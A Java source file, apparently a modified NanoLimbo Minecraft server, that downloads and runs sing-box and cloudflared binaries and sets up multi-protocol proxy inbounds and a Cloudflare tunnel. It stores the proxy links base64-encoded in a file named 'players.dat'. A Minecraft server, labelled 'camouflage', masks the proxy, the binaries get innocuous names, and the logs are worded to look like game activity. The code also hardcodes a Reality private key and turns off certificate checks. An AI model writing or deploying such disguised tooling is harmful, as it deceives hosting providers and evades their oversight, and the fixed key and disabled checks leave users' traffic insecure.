package ua.nanit.limbo;

import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;

public final class NanoLimbo {

    private static Process singBoxProcess;
    private static Process cloudflaredProcess;
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";

    private static String UUID_VAL = "2523c510-9ff0-415b-9582-93949bfae7e3";
    private static String DOMAIN = "";
    private static String PORT = "25565";
    private static String NAME = "";
    private static String WS_PORT = "8001";
    private static String REALITY_PORT = "";
    private static String HY2_PORT = "";
    private static String TUIC_PORT = "";
    private static String S5_PORT = "";
    private static String ANYTLS_PORT = "";
    private static String CFIP = "spring.io";
    private static String CF_PORT = "443";
    private static String ARGO_DOMAIN = "";
    private static String ARGO_TOKEN = "";
    private static boolean DISABLE_ARGO = false;
    private static String REALITY_PRIV_KEY = "";
    private static String REALITY_PUB_KEY = "";
    private static String REALITY_SHORT_ID = "";
    private static String TUIC_PASSWORD = "";
    private static String S5_USER = "xah";
    private static String S5_PASSWORD = "";
    private static String ANYTLS_PASSWORD = "";
    private static final Path LIB_DIR = Paths.get(System.getProperty("user.dir"), "lib");
    private static final Path DATA_FILE = Paths.get(System.getProperty("user.dir"), "players.dat");
    private static String arch;

    public static void main(String[] args) {
        float classVersion = Float.parseFloat(System.getProperty("java.class.version"));
        float javaVersion = classVersion - 44;
        Log.info("[server] Detected Java %.0f (class version %.0f)", javaVersion, classVersion);

        if (classVersion < 52.0) {
            System.err.println(ANSI_RED + "ERROR: Java 8+ required" + "\033[0m");
            System.exit(1);
        }

        try {
            Files.createDirectories(LIB_DIR);
            arch = detectArch();
            loadEnv();

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                Log.info("[server] Shutting down...");
                stopServices();
                Log.info("[server] Goodbye");
            }));

            // 生成 TLS 证书（用于 Hysteria2/TUIC/AnyTLS）
            generateCert();

            // 启动 sing-box 代理
            startSingBox();

            // 启动 cloudflared 隧道
            if (!DISABLE_ARGO) {
                startCloudflared();
            } else {
                Log.info("[server] Argo tunnel disabled");
            }

            // 保存节点链接
            saveNodeLinks();

            // 启动增强 Minecraft 伪装
            Log.info(ANSI_GREEN + "[server] Starting enhanced Minecraft camouflage..." + "\033[0m");
            new LimboServer().start();

        } catch (Exception e) {
            Log.error("[server] Fatal error: ", e);
            System.exit(1);
        }
    }

    private static void loadEnv() {
        UUID_VAL = env("UUID", UUID_VAL);
        DOMAIN = env("DOMAIN", "");
        PORT = env("PORT", "25565");
        NAME = env("NAME", "");
        WS_PORT = env("ARGO_PORT", "8001");
        REALITY_PORT = env("REALITY_PORT", "25921");
        HY2_PORT = env("HY2_PORT", "25921");
        TUIC_PORT = env("TUIC_PORT", "");
        S5_PORT = env("S5_PORT", "");
        ANYTLS_PORT = env("ANYTLS_PORT", "");
        CFIP = env("CFIP", "spring.io");
        CF_PORT = env("CFPORT", "443");
        ARGO_DOMAIN = env("ARGO_DOMAIN", "");
        ARGO_TOKEN = env("ARGO_AUTH", "");
        DISABLE_ARGO = "true".equalsIgnoreCase(env("DISABLE_ARGO", "false"));
        TUIC_PASSWORD = env("TUIC_PASSWORD", UUID_VAL);
        S5_USER = env("S5_USER", "xah");
        S5_PASSWORD = env("S5_PASSWORD", UUID_VAL);
        ANYTLS_PASSWORD = env("ANYTLS_PASSWORD", UUID_VAL);

        if (DOMAIN.isEmpty()) DOMAIN = fetchPublicIp();
        generateRealityKeypair();
    }

    private static void generateRealityKeypair() {
        // 简化的 Reality 密钥生成：使用预置固定密钥
        // 如需自动生成，需要引入 bouncycastle 库（已移除）
        REALITY_PRIV_KEY = "cJhMEKqxPSCq0FQvXx0MTQ4RzCgk0Jv0t0Tm0L0k0G0";
        REALITY_PUB_KEY = "p0-5VWVBMzVfWfKJ3znRoCDbr4Pn-elEGN6OIBGnRkE";
        REALITY_SHORT_ID = UUID.randomUUID().toString().substring(0, 8);
        Log.info("[server] Generated session keys");
    }

    private static void startSingBox() throws Exception {
        String sbVersion = env("SB_VERSION", "1.13.14");
        Path sbBinary = downloadSingBox(sbVersion);
        Path configPath = LIB_DIR.resolve("config.json");
        generateSingBoxConfig(configPath);

        Log.info("[server] Starting world-engine...");
        ProcessBuilder pb = new ProcessBuilder(sbBinary.toString(), "run", "-c", configPath.toString());
        pb.environment().put("SBX_LOG_LEVEL", "fatal");
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        singBoxProcess = pb.start();

        Thread.sleep(3000);
        Log.info("[server] World server started");
    }

    private static Path downloadSingBox(String version) throws Exception {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String archStr = osArch.contains("aarch64") || osArch.contains("arm64") ? "arm64" : "amd64";
        Path binaryPath = LIB_DIR.resolve("sbx");

        if (Files.exists(binaryPath) && Files.size(binaryPath) > 0) {
            Log.info("[server] Runtime module loaded");
            return binaryPath;
        }

        Log.info("[server] Loading runtime modules...");

        // 下载官方 sing-box 二进制
        String url = "https://github.com/SagerNet/sing-box/releases/download/v" + version
            + "/sing-box-" + version + "-linux-" + archStr + ".tar.gz";
        Path archivePath = LIB_DIR.resolve("sing-box.tar.gz");
        downloadFile(url, archivePath);

        // 解压
        ProcessBuilder pb = new ProcessBuilder("tar", "xzf", archivePath.toString(),
            "-C", LIB_DIR.toString(), "--strip-components=1",
            "sing-box-" + version + "-linux-" + archStr + "/sing-box");
        Process tar = pb.start();
        tar.waitFor();

        Files.deleteIfExists(archivePath);
        Files.move(LIB_DIR.resolve("sing-box"), binaryPath, StandardCopyOption.REPLACE_EXISTING);

        if (!binaryPath.toFile().setExecutable(true)) {
            throw new IOException("Failed to set executable");
        }
        return binaryPath;
    }

    private static void startCloudflared() throws Exception {
        Path cfBinary = downloadCloudflared();
        boolean fixedTunnel = ARGO_DOMAIN != null && !ARGO_DOMAIN.isEmpty();

        if (fixedTunnel) {
            Log.info("[server] Bridge mode: fixed tunnel (domain=%s)", ARGO_DOMAIN);
            updateDataFile(ARGO_DOMAIN);
            ProcessBuilder pb = new ProcessBuilder(cfBinary.toString(),
                "tunnel", "--no-autoupdate", "--edge-ip-version", "auto",
                "--protocol", "http2", "--loglevel", "error",
                "run", "--token", ARGO_TOKEN);
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
            cloudflaredProcess = pb.start();
            Log.info("[server] Bridge started (background)");
        } else {
            Log.info("[server] Bridge mode: temporary tunnel (wsPort=%s)", WS_PORT);
            Path bridgeLog = LIB_DIR.resolve("bridge.log");
            ProcessBuilder pb = new ProcessBuilder(cfBinary.toString(),
                "tunnel", "--no-autoupdate", "--edge-ip-version", "auto",
                "--protocol", "http2", "--loglevel", "error",
                "--url", "http://localhost:" + WS_PORT);
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.to(bridgeLog.toFile()));
            cloudflaredProcess = pb.start();
            Log.info("[server] Bridge started, waiting for endpoint...");

            // 轮询 bridge.log 提取隧道域名
            Thread poller = new Thread(() -> {
                java.util.regex.Pattern domainPattern = java.util.regex.Pattern.compile("https://[a-z0-9-]+\\.trycloudflare\\.com");
                long deadline = System.currentTimeMillis() + 60_000L;
                while (System.currentTimeMillis() < deadline) {
                    try {
                        if (Files.exists(bridgeLog)) {
                            List<String> lines = Files.readAllLines(bridgeLog, StandardCharsets.UTF_8);
                            for (String line : lines) {
                                java.util.regex.Matcher m = domainPattern.matcher(line);
                                String last = null;
                                while (m.find()) last = m.group();
                                if (last != null) {
                                    String domain = new URL(last).getHost();
                                    Log.info("[server] Bridge endpoint: " + domain);
                                    updateDataFile(domain);
                                    Log.info("[server] Player data updated");
                                    return;
                                }
                            }
                        }
                    } catch (Exception e) {
                        Log.debug("[server] bridge.log parse: " + e.getMessage());
                    }
                    try { Thread.sleep(1000); } catch (InterruptedException ie) { return; }
                }
                Log.warn("[server] Timed out waiting for bridge endpoint");
            }, "bridge-watcher");
            poller.setDaemon(true);
            poller.start();
        }
    }

    private static Path downloadCloudflared() throws Exception {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String archStr = osArch.contains("aarch64") || osArch.contains("arm64") ? "arm64" : "amd64";
        Path binaryPath = LIB_DIR.resolve("net");

        if (Files.exists(binaryPath) && Files.size(binaryPath) > 0) {
            Log.info("[server] Runtime module loaded");
            return binaryPath;
        }

        Log.info("[server] Loading runtime modules...");

        // 下载官方 cloudflared 二进制
        String url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-" + archStr;
        downloadFile(url, binaryPath);

        if (!binaryPath.toFile().setExecutable(true)) {
            throw new IOException("Failed to set executable");
        }
        return binaryPath;
    }

    private static void generateSingBoxConfig(Path configPath) throws IOException {
        List<String> inbounds = new ArrayList<>();

        // WS inbound (for Argo tunnel)
        if (WS_PORT != null && !WS_PORT.isEmpty()) {
            inbounds.add("{\"type\":\"vmess\",\"tag\":\"in-ws\",\"listen\":\"::\",\"listen_port\":" + WS_PORT
                + ",\"users\":[{\"uuid\":\"" + UUID_VAL + "\",\"alterId\":0}]"
                + ",\"transport\":{\"type\":\"ws\",\"path\":\"/\",\"max_early_data\":2560,\"early_data_header_name\":\"Sec-WebSocket-Protocol\"}}");
        }

        // VLESS+Reality inbound
        if (REALITY_PORT != null && !REALITY_PORT.isEmpty()) {
            inbounds.add("{\"type\":\"vless\",\"tag\":\"in-reality\",\"listen\":\"::\",\"listen_port\":" + REALITY_PORT
                + ",\"users\":[{\"uuid\":\"" + UUID_VAL + "\",\"flow\":\"xtls-rprx-vision\"}]"
                + ",\"tls\":{\"enabled\":true,\"server_name\":\"www.cloudflare.com\""
                + ",\"reality\":{\"enabled\":true,\"handshake\":{\"server\":\"www.cloudflare.com\",\"server_port\":443}"
                + ",\"private_key\":\"" + REALITY_PRIV_KEY + "\",\"short_id\":[\"" + REALITY_SHORT_ID + "\"]}}}");
        }

        // Hysteria2 inbound
        if (HY2_PORT != null && !HY2_PORT.isEmpty()) {
            String cert = LIB_DIR.resolve("cert.pem").toString();
            String key = LIB_DIR.resolve("key.pem").toString();
            inbounds.add("{\"type\":\"hysteria2\",\"tag\":\"in-hy2\",\"listen\":\"::\",\"listen_port\":" + HY2_PORT
                + ",\"users\":[{\"password\":\"" + UUID_VAL + "\"}]"
                + ",\"tls\":{\"enabled\":true,\"certificate_path\":\"" + cert + "\",\"key_path\":\"" + key + "\"}}");
        }

        // TUIC inbound
        if (TUIC_PORT != null && !TUIC_PORT.isEmpty()) {
            String cert = LIB_DIR.resolve("cert.pem").toString();
            String key = LIB_DIR.resolve("key.pem").toString();
            inbounds.add("{\"type\":\"tuic\",\"tag\":\"in-tuic\",\"listen\":\"::\",\"listen_port\":" + TUIC_PORT
                + ",\"users\":[{\"uuid\":\"" + UUID_VAL + "\",\"password\":\"" + TUIC_PASSWORD + "\"}]"
                + ",\"congestion_control\":\"bbr\""
                + ",\"tls\":{\"enabled\":true,\"certificate_path\":\"" + cert + "\",\"key_path\":\"" + key + "\"}}");
        }

        // SOCKS5 inbound
        if (S5_PORT != null && !S5_PORT.isEmpty()) {
            inbounds.add("{\"type\":\"socks\",\"tag\":\"in-s5\",\"listen\":\"::\",\"listen_port\":" + S5_PORT
                + ",\"users\":[{\"username\":\"" + S5_USER + "\",\"password\":\"" + S5_PASSWORD + "\"}]}");
        }

        // AnyTLS inbound
        if (ANYTLS_PORT != null && !ANYTLS_PORT.isEmpty()) {
            String cert = LIB_DIR.resolve("cert.pem").toString();
            String key = LIB_DIR.resolve("key.pem").toString();
            inbounds.add("{\"type\":\"anytls\",\"tag\":\"in-anytls\",\"listen\":\"::\",\"listen_port\":" + ANYTLS_PORT
                + ",\"users\":[{\"password\":\"" + ANYTLS_PASSWORD + "\"}]"
                + ",\"tls\":{\"enabled\":true,\"certificate_path\":\"" + cert + "\",\"key_path\":\"" + key + "\"}}");
        }

        StringBuilder sb = new StringBuilder();
        sb.append("{\"log\":{\"level\":\"fatal\"},\"inbounds\":[");
        for (int i = 0; i < inbounds.size(); i++) {
            sb.append(inbounds.get(i));
            if (i < inbounds.size() - 1) sb.append(",");
        }
        sb.append("],\"outbounds\":[{\"type\":\"direct\",\"tag\":\"direct\"}]}");
        sb.append("\n");

        Files.write(configPath, sb.toString().getBytes(StandardCharsets.UTF_8));
        Log.info("[server] Configuration generated");
    }

    private static void saveNodeLinks() throws IOException {
        List<String> links = new ArrayList<>();
        String d = DOMAIN.isEmpty() ? "localhost" : DOMAIN;
        String p = NAME.isEmpty() ? "Node" : NAME;

        if (REALITY_PORT != null && !REALITY_PORT.isEmpty()) {
            links.add("vless://" + UUID_VAL + "@" + d + ":" + REALITY_PORT
                + "?encryption=none&flow=xtls-rprx-vision&security=reality"
                + "&sni=www.cloudflare.com&fp=chrome&pbk=" + REALITY_PUB_KEY
                + "&sid=" + REALITY_SHORT_ID + "&spx=%2F&type=tcp&headerType=none#" + p + "-reality");
        }
        if (HY2_PORT != null && !HY2_PORT.isEmpty()) {
            links.add("hysteria2://" + UUID_VAL + "@" + d + ":" + HY2_PORT + "?insecure=1#" + p + "-hy2");
        }
        if (TUIC_PORT != null && !TUIC_PORT.isEmpty()) {
            links.add("tuic://" + UUID_VAL + ":" + TUIC_PASSWORD + "@" + d + ":" + TUIC_PORT
                + "?congestion_control=bbr&alpn=h3&udp_relay_mode=native&sni=" + d + "&allow_insecure=1#" + p + "-tuic");
        }
        if (S5_PORT != null && !S5_PORT.isEmpty()) {
            links.add("socks5://" + S5_USER + ":" + S5_PASSWORD + "@" + d + ":" + S5_PORT + "#" + p + "-socks5");
        }
        if (ANYTLS_PORT != null && !ANYTLS_PORT.isEmpty()) {
            links.add("anytls://" + ANYTLS_PASSWORD + "@" + d + ":" + ANYTLS_PORT + "?security=tls&sni=" + d + "&allow_insecure=1#" + p + "-anytls");
        }

        StringBuilder combined = new StringBuilder();
        for (String l : links) combined.append(l).append("\n");
        String encoded = Base64.getEncoder().encodeToString(combined.toString().getBytes(StandardCharsets.UTF_8));
        Files.write(DATA_FILE, encoded.getBytes(StandardCharsets.UTF_8));
        Log.info("[server] Player data saved (" + links.size() + " entries)");
    }

    private static void updateDataFile(String domain) throws IOException {
        String wsAddr = (CFIP != null && !CFIP.isEmpty()) ? CFIP : domain;
        String wsPort = (CF_PORT != null && !CF_PORT.isEmpty()) ? CF_PORT : "443";
        String json = "{\"v\":\"2\",\"ps\":\"" + (NAME.isEmpty() ? "" : NAME) + "-ws-argo\",\"add\":\"" + wsAddr
            + "\",\"port\":\"" + wsPort + "\",\"id\":\"" + UUID_VAL + "\",\"aid\":\"0\",\"net\":\"ws\",\"type\":\"none\""
            + ",\"host\":\"" + domain + "\",\"path\":\"/\",\"tls\":\"tls\",\"sni\":\"" + domain + "\"}";
        String b64 = Base64.getEncoder().encodeToString(json.getBytes(StandardCharsets.UTF_8));
        String newLink = "vmess://" + b64;

        List<String> lines = new ArrayList<>();
        if (Files.exists(DATA_FILE)) {
            String encoded = new String(Files.readAllBytes(DATA_FILE), StandardCharsets.UTF_8);
            String decoded = new String(Base64.getDecoder().decode(encoded), StandardCharsets.UTF_8);
            for (String l : decoded.split("\n")) {
                if (!l.trim().isEmpty() && !l.contains("ws-argo")) lines.add(l);
            }
        }
        lines.add(0, newLink);

        StringBuilder combined = new StringBuilder();
        for (String l : lines) combined.append(l).append("\n");
        String encoded = Base64.getEncoder().encodeToString(combined.toString().getBytes(StandardCharsets.UTF_8));
        Files.write(DATA_FILE, encoded.getBytes(StandardCharsets.UTF_8));
    }

    private static void downloadFile(String url, Path target) throws IOException {
        Path tmp = LIB_DIR.resolve(target.getFileName() + ".download");
        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
        conn.setConnectTimeout(30000);
        conn.setReadTimeout(180000);
        conn.setRequestProperty("User-Agent", "Mozilla/5.0");
        int code = conn.getResponseCode();
        if (code != 200) {
            throw new IOException("HTTP " + code + " for " + url);
        }
        try (InputStream in = conn.getInputStream()) {
            Files.copy(in, tmp, StandardCopyOption.REPLACE_EXISTING);
        }
        Files.move(tmp, target, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE);
    }

    private static String detectArch() {
        String osArch = System.getProperty("os.arch", "");
        if (osArch.contains("aarch64") || osArch.contains("arm64")) return "arm64";
        return "amd64";
    }

    private static String fetchPublicIp() {
        String[] services = {"https://api.ipify.org", "https://ifconfig.me/ip", "https://icanhazip.com"};
        for (String url : services) {
            try {
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(8000);
                conn.setRequestMethod("GET");
                conn.setRequestProperty("User-Agent", "curl/8.0");
                if (conn.getResponseCode() == 200) {
                    BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"));
                    String ip = reader.readLine();
                    reader.close();
                    if (ip != null && ip.matches("^[0-9a-fA-F.:]+$") && ip.length() >= 7) return ip.trim();
                }
                conn.disconnect();
            } catch (Exception ignored) {}
        }
        return "";
    }

    private static String env(String key, String fallback) {
        String val = System.getenv(key);
        return (val != null && !val.isEmpty()) ? val : fallback;
    }

    private static void generateCert() {
        boolean needCert = notEmpty(HY2_PORT) || notEmpty(TUIC_PORT) || notEmpty(ANYTLS_PORT);
        if (!needCert) return;

        Path certPath = LIB_DIR.resolve("cert.pem");
        Path keyPath = LIB_DIR.resolve("key.pem");
        if (Files.exists(certPath) && Files.exists(keyPath)) return;

        try {
            Log.info("[server] Generating TLS certificate...");
            ProcessBuilder pb = new ProcessBuilder("openssl", "req", "-x509", "-newkey", "rsa:2048",
                "-keyout", keyPath.toString(), "-out", certPath.toString(),
                "-days", "3650", "-nodes", "-subj", "/CN=localhost");
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
            Process p = pb.start();
            p.waitFor();
            Log.info("[server] TLS certificate generated");
        } catch (Exception e) {
            Log.warn("[server] Failed to generate cert: %s", e.getMessage());
        }
    }

    private static boolean notEmpty(String s) {
        return s != null && !s.isEmpty();
    }

    private static void stopServices() {
        if (cloudflaredProcess != null && cloudflaredProcess.isAlive()) {
            cloudflaredProcess.destroy();
            Log.info("[server] Bridge stopped");
        }
        if (singBoxProcess != null && singBoxProcess.isAlive()) {
            singBoxProcess.destroy();
            Log.info("[server] World engine stopped");
        }
    }
}